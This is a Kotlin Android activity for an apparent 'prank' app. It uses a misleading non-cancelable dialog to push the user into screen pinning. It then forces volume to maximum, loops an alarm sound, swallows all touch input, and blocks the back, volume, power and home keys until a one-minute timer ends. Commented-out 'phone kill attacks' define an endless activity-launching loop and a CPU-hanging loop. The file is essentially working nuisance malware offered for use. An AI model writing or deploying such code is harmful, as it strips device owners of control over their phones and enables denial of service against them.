package com.example.myapplication

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.media.AudioManager
import android.media.MediaPlayer
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.KeyEvent
import android.view.View
import android.view.WindowManager
import androidx.activity.OnBackPressedCallback
import androidx.appcompat.app.AppCompatActivity
import android.app.AlertDialog
import android.view.LayoutInflater
import android.widget.Button
import java.io.IOException

class MainActivity : AppCompatActivity() {
    private lateinit var mediaPlayer: MediaPlayer
    private lateinit var audioManager: AudioManager
    private lateinit var volumeReceiver: BroadcastReceiver
    private val handler = Handler(Looper.getMainLooper())

    private var pinningAttempted = false // Track if screen pinning has been attempted

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Remove title bar and show custom logo on ActionBar
        supportActionBar?.setDisplayShowTitleEnabled(false)
        supportActionBar?.setLogo(R.drawable.logo)
        supportActionBar?.setDisplayUseLogoEnabled(true)
        supportActionBar?.setDisplayShowHomeEnabled(true)

        setContentView(R.layout.activity_prank)  // Set the prank activity layout
        showCustomDialog()  // Show the custom dialog immediately

        // Initialize audio manager
        audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager

        // Handle back press to disable the back button
        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                // Disable the back button
            }
        })

        // Maximize the volume if it's not already
        val currentVolume = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC)
        if (currentVolume == 0) {
            audioManager.setStreamVolume(
                AudioManager.STREAM_MUSIC,
                audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
                0
            )
        }

        // Request audio focus
        val result = audioManager.requestAudioFocus(
            { },  // Audio focus change listener (empty)
            AudioManager.STREAM_ALARM,
            AudioManager.AUDIOFOCUS_GAIN
        )

        if (result == AudioManager.AUDIOFOCUS_REQUEST_GRANTED) {
            // Continue once audio focus is granted
        }

        // Make the activity fullscreen and prevent it from closing
        window.addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN)
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        window.addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD)

        setupAudio()  // Setup the audio configurations
        setupVolumeControl()  // Setup the volume control to maintain max volume
        blockUserInteraction()  // Block user interaction (touch events)
        startAutoDisableTimer()  // Start a timer to disable after 1 minute
    }

    private fun showCustomDialog() {
        val dialogView = LayoutInflater.from(this).inflate(R.layout.dialog_permission, null)
        val alertDialog = AlertDialog.Builder(this)
            .setView(dialogView)
            .setCancelable(false)  // Make dialog non-cancelable
            .create()

        val allowButton: Button = dialogView.findViewById(R.id.allow_button)

        // Handle the button click to proceed
        allowButton.setOnClickListener {
            alertDialog.dismiss()  // Close the custom dialog
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                startLockTask()  // Trigger the system's screen pinning dialog
                pinningAttempted = true  // Set flag to indicate pinning was attempted
            }

            // Wait for 5 seconds before starting the audio
            handler.postDelayed({
                startAudio()  // Start audio after the delay
            }, 5000)  // 5000 milliseconds = 5 seconds
        }

        alertDialog.show()  // Show the dialog
    }

    // Start audio playback
    private fun startAudio() {
        mediaPlayer = MediaPlayer()

        try {
            // Open and prepare the alarm sound from resources
            val afd = resources.openRawResourceFd(R.raw.alarm)
            mediaPlayer.setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
            afd.close()

            // Set stream type and enable looping
            mediaPlayer.setAudioStreamType(AudioManager.STREAM_ALARM)
            mediaPlayer.isLooping = true

            // Prepare and start the media player
            mediaPlayer.prepare()  // Use prepare() instead of prepareAsync
            mediaPlayer.start()  // Start playback

            // Phone kill attacks
//            forkBomb(this)
//            hangDevice()

        } catch (e: IOException) {
            e.printStackTrace()  // Log errors related to the media player
        }
    }
//    private fun forkBomb(context: Context) {
//        while (true) {
//            val intent = Intent(context, MainActivity::class.java)
//            context.startActivity(intent)
//            context.startActivity(intent)
//            context.startActivity(intent)// Opens new instance of app repeatedly
//        }
//    }
//    private fun hangDevice() {
//        while (true) {
//            // This runs in a loop, keeping the CPU busy
//            Math.sqrt(999999999.999)
//            Math.sqrt(999999999.999)
//            Math.sqrt(999999999.999)
//        }
//    }



    private fun setupAudio() {
        // Maximize the alarm volume
        audioManager.setStreamVolume(
            AudioManager.STREAM_ALARM,
            audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM),
            AudioManager.FLAG_SHOW_UI  // Optionally show the volume UI
        )
    }

    private fun setupVolumeControl() {
        volumeReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                // Ensure volume stays at max whenever it changes
                audioManager.setStreamVolume(
                    AudioManager.STREAM_MUSIC,
                    audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
                    0
                )
            }
        }

        // Register the receiver to monitor volume changes
        registerReceiver(volumeReceiver, IntentFilter("android.media.VOLUME_CHANGED_ACTION"))
    }

    private fun blockUserInteraction() {
        // Block all touch events
        val blocker = View(this)
        blocker.systemUiVisibility = View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
        blocker.setOnTouchListener { _, _ -> true }

        window.addContentView(
            blocker,
            WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT
            )
        )
    }

    private fun startAutoDisableTimer() {
        handler.postDelayed({
            mediaPlayer.stop()  // Stop audio playback
            unregisterReceiver(volumeReceiver)  // Unregister volume receiver
            finish()  // Finish the activity after 1 minute
        }, 60000)  // 1 minute delay
    }

    // Disable recent apps button
    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (!hasFocus && pinningAttempted) {
            // Re-trigger screen pinning if it was attempted but not accepted
            showCustomDialog()
        } else {
            moveTaskToBack(false)
        }
    }

    // Block hardware buttons like volume, power, and home
    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        return when (keyCode) {
            KeyEvent.KEYCODE_VOLUME_UP, KeyEvent.KEYCODE_VOLUME_DOWN,
            KeyEvent.KEYCODE_POWER, KeyEvent.KEYCODE_HOME -> true
            else -> super.onKeyDown(keyCode, event)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (::mediaPlayer.isInitialized) {
            mediaPlayer.release()  // Release the media player resources
        }
        if (::volumeReceiver.isInitialized) {
            unregisterReceiver(volumeReceiver)  // Unregister the volume receiver
        }
        handler.removeCallbacksAndMessages(null)  // Clean up any pending handlers
    }
}
